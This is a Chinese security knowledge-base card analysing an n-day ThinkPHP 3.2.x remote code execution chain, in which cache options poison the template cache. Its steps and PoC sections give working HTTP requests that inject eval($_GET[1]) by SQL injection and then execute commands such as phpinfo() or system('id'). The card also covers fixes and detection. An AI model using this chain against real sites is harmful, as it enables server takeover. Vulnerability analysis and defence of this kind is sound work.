---
id: web-php-framework-thinkphp32-cache-option-template-cache-include-rce
title: ThinkPHP 3.2.x cache 选项覆盖模板缓存 RCE：cid[cache][key]/[temp] 让 S() 写入 ParseTemplateBehavior 待 include 的 md5 缓存文件
type: scenario
domain: web
path: web/php/framework
technique: thinkphp32-cache-option-template-cache-include-rce
tags:
- php
- thinkphp
- cache
- template-cache
- file-inclusion
- rce
- nday
- options-pollution
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-09'
updated: '2026-11-09'
affected_versions: 3.2.x（原文分析范围；原文未给出更细修复版本）
verification:
  verified_by: verifier-V381
  verified_at: '2026-11-09T08:22:55+08:00'
  notes: 已对照原文与3张图核对：find 的 cache 分支调用 S(key,'',cache) 读、S(key,data,cache) 写；cache[key]=base64(第二篇文章内容)/cache[temp]=../tp/Application/Runtime/Cache/Home/ 使数据缓存文件名与 ParseTemplateBehavior 的 md5() 模板缓存路径对齐并覆盖，第二次 cid[where]=2 请求 include 后 1=phpinfo() 执行成功；图片02/03 的 key、payload、base64 值与卡片一致。与 TP5 视图包含/TP6 缓存反序列化卡不同链，非重复。ThinkPHP 3.2.x 为原文分析范围，affected_versions 保留。PoC 未复跑
url: /docs/web/php/framework/web-php-framework-thinkphp32-cache-option-template-cache-include-rce/
draft: false
kb_aliases:
- ThinkPHP 3.2 缓存覆盖 RCE
- cache[key] cache[temp] 利用
- ParseTemplateBehavior 缓存包含
- Storage::load include 缓存文件
- 模板缓存覆盖 getshell
- S() 缓存文件写入
---

## 一句话结论

ThinkPHP 3.2.x 的 `find($options)` 在发现 `options['cache']` 时会调用 `S($key,'',$cache)` 读缓存、查询后再 `S($key,$data,$cache)` 写缓存；由于 `cache[key]`、`cache[temp]` 等键都可被用户数组控制，攻击者可让 `S()` 把包含 SQL 注入结果的缓存文件写到模板缓存目录，并以 `md5(base64(正常文章内容))` 命名；随后请求该正常文章时，`ParseTemplateBehavior` 用同样的 `md5($_content)` 计算模板缓存路径并通过 `Storage::load` include 该文件，缓存中的 PHP payload 被执行，形成「SQL 注入 → 缓存文件覆盖 → 模板缓存包含 → RCE」。

## 原理

- **find 的缓存分支**：`find($options)` 在解析 options 后执行 `if (isset($options['cache'])) { $cache=$options['cache']; $key = is_string($cache['key']) ? $cache['key'] : md5(serialize($options)); $data = S($key,'',$cache); if (false !== $data) return $data; }`；查询结束后又执行 `S($key,$data,$cache)` 把结果写入缓存。
- **S() 完全信任 options**：`S($name,$value,$options)` 在 `is_array($options)` 时调用 `Think\Cache::getInstance($type,$options)`，File 缓存驱动用 `$options['temp']` 作为存储目录、`$options['prefix']` 作为文件名前缀；`get` 读取 `temp . prefix . md5(DATA_CACHE_KEY.$name) . '.php'`，`set` 把序列化后的值写入同一路径。攻击者通过 `cache[temp]`、`cache[key]` 同时控制写入目录与文件名种子。
- **模板缓存的命名**：控制器把查询结果 `base64_encode` 后交给 `show()`/`display()`；`fetch()` 在 content 非空时触发 `view_parse` hook，`ParseTemplateBehavior::run` 取 `$_content = $_data['content']`，用 `CACHE_PATH . prefix . md5($_content) . TMPL_CACHFILE_SUFFIX` 作为模板缓存路径，`checkContentCache` 命中后调用 `Storage::load(...)`，File 驱动直接 `include` 该文件。
- **两条 md5 链对齐**：数据缓存文件名是 `md5(DATA_CACHE_KEY . key)`，模板缓存文件名是 `md5($_content)`。当 `DATA_CACHE_KEY` 为空且把 `cache[key]` 设为控制器将要传给 show 的 `base64_encode(正常内容)` 时，两者指向同一路径；`cache[temp]` 设为模板缓存目录（如 `../tp/Application/Runtime/Cache/Home/`）后，`S()` 的写操作就覆盖了模板引擎下一次要 include 的文件。
- **payload 的来源**：借助同篇的 `find($options)` where 字符串注入（`cid[where]=2=0 union select '\r\neval($_GET[1]);//'`），让查询结果本身变成 PHP 代码；`S()` 把它序列化写入缓存文件，模板缓存 include 时执行 `eval($_GET[1])`。
- **触发**：再请求一个正常内容（如 `cid[where]=2`，返回第二篇文章），控制器把该内容的 base64 交给 show，模板引擎按 md5 命中被覆盖的缓存文件并 include；也可在第一次请求后由任意访问该内容的请求触发。
- **为什么这是独立原子**：SQL 注入本身只能读数据；本条利用把「用户可控的 cache 配置」变成对框架运行时目录的任意文件写，再借框架自身的模板缓存 include 把写升级为代码执行。即使没有 SQL 注入，只要能把可控 PHP 内容写入缓存文件并让模板缓存路径命中，同样可 RCE。
- **边界**：需要应用把请求数组直接传入 `find()`（提供 `cache` 键）、运行时缓存目录可写、模板引擎为 Think（默认）且缓存未禁用；若 `DATA_CACHE_KEY` 非空、缓存后缀/前缀与模板缓存不一致，需相应调整 key 或利用 `cache[prefix]` 对齐。

## 触发条件

- 目标为 ThinkPHP 3.2.x，控制器存在用户数组 → `find($options)` 的调用（如 `find($cid)`）。
- `options['cache']` 未被框架/业务过滤，`cache[temp]`、`cache[key]` 可写；File 缓存驱动为默认或可指定。
- 运行时缓存目录（`Application/Runtime/Cache/...`）对 Web 进程可写，模板缓存开启且 `TMPL_ENGINE_TYPE` 为默认 Think。
- 能通过 SQL 注入或其它方式让查询结果包含 PHP 代码（如 `eval($_GET[1]);//`）。

## 利用步骤

1. 正常访问目标文章（如 cid=2），记录控制器输出的内容（即 `base64_encode($content['content'])` 的值，也就是模板缓存 md5 的输入）。
2. 发送第一次请求，利用 where 字符串注入把 PHP payload 作为查询结果，同时设置 cache 选项：
   `?s=home/index/page&cid[where]=2=0 union select '\r\neval($_GET[1]);//'&cid[cache][key]=<上一步的 base64 值>&cid[cache][temp]=../tp/Application/Runtime/Cache/Home/`
   `S()` 会把序列化后的结果写入 `md5(cache key).php`。
3. 发送第二次请求访问正常文章（如 `?s=home/index/page&cid[where]=2`），模板引擎计算相同 md5 并 `Storage::load` include 被覆盖的缓存文件。
4. 通过 `?1=system('id')` 之类的参数触发 `eval`，或直接在请求中携带命令参数。
5. 验证命令执行；清理写入的缓存文件并恢复模板缓存。

## PoC

```http
# 第一次：SQL 注入返回 PHP 代码，并按模板缓存路径写入缓存文件
GET /index.php?s=home/index/page&cid[where]=2=0%20union%20select%20%27%0D%0Aeval($_GET[1]);//%27&cid[cache][key]=VGhpcyBpcyB0aGUgY29udGVudCBvZiB0aGUgc2Vjb25kIGFydGljbGU=&cid[cache][temp]=../tp/Application/Runtime/Cache/Home/ HTTP/1.1

# 第二次：访问正常文章，模板缓存 include 被覆盖的文件
GET /index.php?s=home/index/page&cid[where]=2&1=phpinfo(); HTTP/1.1
```

原文截图显示第二次请求返回 phpinfo 页面；本卡未复现。实际 key/temp 需按目标的文章内容 base64 与运行时路径调整。

## 变体与关联

- **无 SQL 注入时**：若应用有其它把可控字符串写入缓存的路径（如用户可控缓存键值），同样可尝试对齐模板缓存命名后 include。
- **数据缓存反序列化**：`S()` 读缓存时会对文件内容 `unserialize`，若能控制缓存文件内容，可改为反序列化 gadget 链；本卡走的是 include 执行 PHP。
- **关联卡**：ThinkPHP 3.2 find options where 字符串注入（payload 来源）、ParseTemplateBehavior 模板缓存机制、TP 视图模板包含卡。
- **修复**：禁止用户控制 `find()` 的 options/cache 参数；缓存目录移出可写范围或加路径校验；升级框架并禁用动态缓存配置。

## 检测与防御

- **输入层**：绝不把请求数组直接传给 `find()`/`where()`；对 `cache` 等 options 键做白名单，禁止用户指定 `temp`/`prefix`/`key`。
- **框架/配置**：固定缓存目录与 key 前缀（设置非空 `DATA_CACHE_KEY`），校验缓存文件名路径必须位于预期目录；模板缓存目录与数据缓存目录分离。
- **文件与权限**：运行时缓存目录最小权限，禁止 Web 进程写入可被 include 的目录之外的路径；对缓存文件做完整性/内容校验（`DATA_CACHE_CHECK`）。
- **检测**：监控 `cid[cache]`、`cache[temp]`、`cache[key]` 形式的请求参数；检测运行时目录中出现包含 `eval`/`<?php` 的缓存文件；关联 SQL 注入告警与随后的模板缓存 include 行为。
